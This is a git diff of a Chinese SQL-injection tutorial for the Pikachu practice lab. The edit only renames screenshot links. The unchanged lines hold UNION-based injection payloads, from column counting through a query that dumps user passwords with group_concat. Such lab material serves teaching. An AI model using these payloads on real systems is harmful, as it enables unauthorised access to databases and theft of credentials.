@@ -35,11 +35,11 @@ SQL注入就是指Web应用程序对用户输入数据的合法性没有判断�
 
 3.`order by 3`判断列数
 
-![MVIAG3O)I_RL_{IJE8ET83P.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/MVIAG3O)I_RL_%7BIJE8ET83P.png)
+![3.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/3.png)
 
 4.用union联合注入，`id=-1 union select 1,2`判断输出位置（此时union的前一个条件为假）
 
-![RB1J6{){B8Y9UNIK~6(ID51.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/RB1J6%7B)%7BB8Y9UNIK%7E6(ID51.png)
+![4.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/4.png)
 
 5.union注入获取数据库`id=-1 union select database(),2`
 
@@ -63,7 +63,7 @@ SQL注入就是指Web应用程序对用户输入数据的合法性没有判断�
 9.获取用户密码
 `id=-1 union select (select group_concat(password) from pikachu.users),2`
 
-![M0QA~TJK5)LXYNN6P0PSP0F.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/M0QA%7ETJK5)LXYNN6P0PSP0F.png)
+![5.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/5.png)
 
 
 
